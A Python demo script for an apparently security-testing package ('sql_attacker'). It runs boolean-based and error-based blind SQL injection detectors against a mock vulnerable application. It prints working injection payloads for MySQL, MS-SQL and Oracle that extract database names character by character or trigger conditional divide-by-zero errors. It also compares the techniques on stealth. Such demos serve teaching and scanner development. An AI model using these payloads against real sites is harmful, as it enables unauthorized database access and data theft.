#!/usr/bin/env python3
"""
Demonstration of Blind SQL Injection Inference Techniques

This script demonstrates both behavioral inference (Boolean-based) and 
error-based/conditional error inference techniques for blind SQL injection.

Usage:
    python demo_blind_sqli_inference.py
"""

import sys
import os

# Add parent directory to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from sql_attacker.boolean_blind_detector import BooleanBlindDetector
from sql_attacker.error_based_blind_detector import ErrorBasedBlindDetector


class MockResponse:
    """Mock HTTP response for demonstration"""
    def __init__(self, text, status_code=200, headers=None):
        self.text = text
        self.status_code = status_code
        self.headers = headers or {}


def simulate_vulnerable_app(payload, true_response="User found: admin", false_response="User not found"):
    """
    Simulate a vulnerable application that responds differently based on SQL injection.
    
    For Boolean-based blind: Different content for true/false conditions
    For Error-based blind: Error responses for true conditions
    """
    payload_lower = payload.lower()
    
    # Detect if this is a true condition (1=1, 'a'='a', etc.)
    is_true_condition = False
    
    # Simple true condition patterns
    if any(x in payload_lower for x in ['1=1', '2=2', '5=5', "'a'='a", "'x'='x", "'1'='1"]):
        is_true_condition = True
    
    # False condition patterns
    if any(x in payload_lower for x in ['1=2', '1=0', '5=6', "'a'='b", "'x'='y", "'1'='2"]):
        is_true_condition = False
    
    # ASCII code tests (simulating "database" = [100, 97, 116, 97, 98, 97, 115, 101])
    # Checking first character 'd' = ASCII 100
    if 'ascii' in payload_lower and 'position' not in payload_lower:
        # Simplified: check for ASCII code matching
        if 'ascii_code=100' in payload_lower or '=100' in payload_lower:
            is_true_condition = True
        elif 'ascii_code=97' in payload_lower or '=97' in payload_lower:
            is_true_condition = False  # Not matching first char
    
    # Check for conditional error payloads
    has_error_trigger = any(x in payload_lower for x in ['1/0', 'div', 'cast', "cast('a' as int"])
    
    if has_error_trigger and is_true_condition:
        # Trigger error when condition is true
        return MockResponse(
            "Error: Division by zero encountered in query execution",
            status_code=500
        )
    elif has_error_trigger and not is_true_condition:
        # No error when condition is false
        return MockResponse(
            "Query executed successfully",
            status_code=200
        )
    else:
        # Standard boolean-based response
        if is_true_condition:
            return MockResponse(true_response, status_code=200)
        else:
            return MockResponse(false_response, status_code=200)


def test_request_boolean(payload, param, param_type, **kwargs):
    """Test function for boolean-based blind SQLi"""
    return simulate_vulnerable_app(payload)


def test_request_error(payload, param, param_type, **kwargs):
    """Test function for error-based blind SQLi"""
    return simulate_vulnerable_app(payload)


def demo_boolean_blind():
    """Demonstrate Boolean-based Blind SQL Injection"""
    print("\n" + "=" * 70)
    print("DEMONSTRATION: Boolean-Based Blind SQL Injection")
    print("=" * 70)
    print()
    print("This technique uses behavioral inference where the application")
    print("responds differently when a tested condition is true vs false.")
    print()
    
    detector = BooleanBlindDetector(similarity_threshold=0.9)
    
    # Step 1: Establish baseline
    print("[Step 1] Establishing baseline response...")
    baseline_response = simulate_vulnerable_app("normal_value")
    detector.establish_baseline(baseline_response)
    print(f"✓ Baseline: {baseline_response.text[:50]}...")
    print()
    
    # Step 2: Test for vulnerability
    print("[Step 2] Testing for boolean-based blind SQLi...")
    results = detector.test_boolean_injection(
        test_request_boolean,
        url="http://example.com/user",
        param="id",
        param_type="GET"
    )
    
    if results['vulnerable']:
        print(f"✓ VULNERABLE! Confidence: {results['confidence']:.2%}")
        print(f"  Differentiation score: {results['differentiation_score']:.2%}")
        print(f"  True responses: {results['true_pattern']['count']}")
        print(f"  False responses: {results['false_pattern']['count']}")
    else:
        print("✗ Not vulnerable")
    print()
    
    # Step 3: Demonstrate payload examples from problem statement
    print("[Step 3] Testing specific payload examples...")
    print()
    print("MySQL payload example:")
    print("  ' AND ASCII(SUBSTRING((SELECT database()),1,1))=68--")
    mysql_payload = "' AND ASCII(SUBSTRING((SELECT database()),1,1))=100--"
    response = simulate_vulnerable_app(mysql_payload)
    print(f"  Response: {response.text[:50]}...")
    print()
    
    print("MS-SQL payload example:")
    print("  ' AND ASCII(SUBSTRING((SELECT DB_NAME()),1,1))=68--")
    mssql_payload = "' AND ASCII(SUBSTRING((SELECT DB_NAME()),1,1))=100--"
    response = simulate_vulnerable_app(mssql_payload)
    print(f"  Response: {response.text[:50]}...")
    print()
    
    print("Oracle payload example:")
    print("  ' AND ASCII(SUBSTR((SELECT user FROM dual),1,1))=68--")
    oracle_payload = "' AND ASCII(SUBSTR((SELECT user FROM dual),1,1))=100--"
    response = simulate_vulnerable_app(oracle_payload)
    print(f"  Response: {response.text[:50]}...")
    print()
    
    # Step 4: Show report
    print("[Step 4] Detection Report:")
    print(detector.generate_report())


def demo_error_based_blind():
    """Demonstrate Error-Based Blind SQL Injection"""
    print("\n" + "=" * 70)
    print("DEMONSTRATION: Error-Based/Conditional Error Blind SQL Injection")
    print("=" * 70)
    print()
    print("This technique triggers errors conditionally. When a condition is")
    print("true, a deliberate error (divide-by-zero, type conversion) occurs.")
    print()
    
    detector = ErrorBasedBlindDetector(confidence_threshold=0.7)
    
    # Step 1: Establish baseline
    print("[Step 1] Establishing baseline response...")
    baseline_response = simulate_vulnerable_app("normal_value")
    detector.establish_baseline(baseline_response)
    print(f"✓ Baseline: {baseline_response.text[:50]}...")
    print()
    
    # Step 2: Test for vulnerability
    print("[Step 2] Testing for error-based blind SQLi...")
    
    # Test MySQL
    print("\n[Testing MySQL payloads]")
    results_mysql = detector.test_conditional_error_injection(
        test_request_error,
        url="http://example.com/user",
        param="id",
        param_type="GET",
        db_type="mysql"
    )
    
    if results_mysql['vulnerable']:
        print(f"✓ VULNERABLE! Confidence: {results_mysql['confidence']:.2%}")
        print(f"  Errors on TRUE: {results_mysql['error_on_true']}")
        print(f"  No errors on FALSE: {results_mysql['no_error_on_false']}")
    else:
        print("✗ Not vulnerable")
    
    # Test MS-SQL
    print("\n[Testing MS-SQL payloads]")
    results_mssql = detector.test_conditional_error_injection(
        test_request_error,
        url="http://example.com/user",
        param="id",
        param_type="GET",
        db_type="mssql"
    )
    
    if results_mssql['vulnerable']:
        print(f"✓ VULNERABLE! Confidence: {results_mssql['confidence']:.2%}")
    else:
        print("✗ Not vulnerable")
    
    # Test Oracle
    print("\n[Testing Oracle payloads]")
    results_oracle = detector.test_conditional_error_injection(
        test_request_error,
        url="http://example.com/user",
        param="id",
        param_type="GET",
        db_type="oracle"
    )
    
    if results_oracle['vulnerable']:
        print(f"✓ VULNERABLE! Confidence: {results_oracle['confidence']:.2%}")
    else:
        print("✗ Not vulnerable")
    
    print()
    
    # Step 3: Demonstrate payload examples from problem statement
    print("[Step 3] Testing specific payload examples...")
    print()
    
    print("Oracle conditional error example:")
    print("  (SELECT 1/0 FROM dual WHERE (SELECT username FROM all_users")
    print("   WHERE username = 'DBSNMP') = 'DBSNMP')")
    oracle_error = "' AND (SELECT 1/0 FROM dual WHERE 1=1)=1--"
    response = simulate_vulnerable_app(oracle_error)
    print(f"  Status: {response.status_code}")
    print(f"  Response: {response.text[:60]}...")
    print()
    
    print("MySQL conditional error example:")
    print("  AND IF((SELECT SUBSTRING(@@version,1,1))='5', (SELECT 1/0), 1)")
    mysql_error = "' AND IF(1=1, (SELECT 1/0), 1)--"
    response = simulate_vulnerable_app(mysql_error)
    print(f"  Status: {response.status_code}")
    print(f"  Response: {response.text[:60]}...")
    print()
    
    print("MS-SQL conditional error example:")
    print("  AND 1=CASE WHEN (SELECT TOP 1 name FROM master..sysdatabases)='master'")
    print("  THEN 1/0 ELSE 1 END")
    mssql_error = "' AND 1=CASE WHEN 1=1 THEN 1/0 ELSE 1 END--"
    response = simulate_vulnerable_app(mssql_error)
    print(f"  Status: {response.status_code}")
    print(f"  Response: {response.text[:60]}...")
    print()
    
    # Step 4: Show report
    print("[Step 4] Detection Report:")
    print(detector.generate_report())


def demo_comparison():
    """Compare both techniques"""
    print("\n" + "=" * 70)
    print("COMPARISON: Boolean-Based vs Error-Based Blind SQL Injection")
    print("=" * 70)
    print()
    
    comparison = """
┌─────────────────────────┬──────────────────────────┬──────────────────────────┐
│ Aspect                  │ Boolean-Based Blind      │ Error-Based Blind        │
├─────────────────────────┼──────────────────────────┼──────────────────────────┤
│ Detection Method        │ Content differentiation  │ Error/no-error detection │
│                         │ (true vs false response) │ (HTTP 500, error msgs)   │
├─────────────────────────┼──────────────────────────┼──────────────────────────┤
│ Observable Behavior     │ Different page content,  │ Error messages, HTTP 500,│
│                         │ different lengths        │ stack traces             │
├─────────────────────────┼──────────────────────────┼──────────────────────────┤
│ Payload Complexity      │ Simple conditionals      │ Conditional errors       │
│                         │ ' AND 1=1--             │ ' AND 1/0--             │
├─────────────────────────┼──────────────────────────┼──────────────────────────┤
│ Speed                   │ Moderate (content diff)  │ Fast (clear error/ok)    │
├─────────────────────────┼──────────────────────────┼──────────────────────────┤
│ Reliability             │ High (if responses       │ High (if errors show)    │
│                         │ differ consistently)     │                          │
├─────────────────────────┼──────────────────────────┼──────────────────────────┤
│ Stealth                 │ Moderate (normal-looking)│ Low (triggers errors)    │
├─────────────────────────┼──────────────────────────┼──────────────────────────┤
│ Example Payloads        │ MySQL:                   │ MySQL:                   │
│                         │ ' AND ASCII(SUBSTR(...)) │ ' AND IF(..., 1/0, 1)   │
│                         │ MS-SQL:                  │ MS-SQL:                  │
│                         │ ' AND ASCII(SUBSTR(...)) │ ' AND CASE WHEN ... 1/0 │
│                         │ Oracle:                  │ Oracle:                  │
│                         │ ' AND ASCII(SUBSTR(...)) │ ' AND (SELECT 1/0 ...)  │
└─────────────────────────┴──────────────────────────┴──────────────────────────┘

Both techniques enable data extraction when:
  ✓ No out-of-band (OOB) channels are available
  ✓ No direct data leakage in responses
  ✓ Only blind inference is possible

The choice depends on:
  • Application error handling (suppressed vs displayed)
  • Need for stealth vs speed
  • Response consistency
    """
    print(comparison)


def main():
    """Main demonstration"""
    print("\n" + "=" * 70)
    print("         BLIND SQL INJECTION INFERENCE TECHNIQUES")
    print("                    Demonstration")
    print("=" * 70)
    print()
    print("This demo showcases two major blind SQL injection techniques:")
    print("  1. Behavioral Inference (Boolean-based Blind SQLi)")
    print("  2. Error-based/Conditional Error Inference")
    print()
    print("These techniques enable data extraction when no out-of-band")
    print("channels or data-leak channels are available.")
    print()
    
    input("Press Enter to start Boolean-Based demonstration...")
    demo_boolean_blind()
    
    input("\nPress Enter to start Error-Based demonstration...")
    demo_error_based_blind()
    
    input("\nPress Enter to see comparison...")
    demo_comparison()
    
    print("\n" + "=" * 70)
    print("                    Demonstration Complete")
    print("=" * 70)
    print()
    print("Summary:")
    print("  ✓ Boolean-based blind SQLi uses content differentiation")
    print("  ✓ Error-based blind SQLi uses conditional error triggering")
    print("  ✓ Both enable character-by-character data extraction")
    print("  ✓ Both support MySQL, MS-SQL, Oracle, and PostgreSQL")
    print()
    print("For more details, see:")
    print("  - sql_attacker/boolean_blind_detector.py")
    print("  - sql_attacker/error_based_blind_detector.py")
    print("  - sql_attacker/BLIND_SQLI_GUIDE.md")
    print()


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n\nDemo interrupted by user.")
        sys.exit(0)
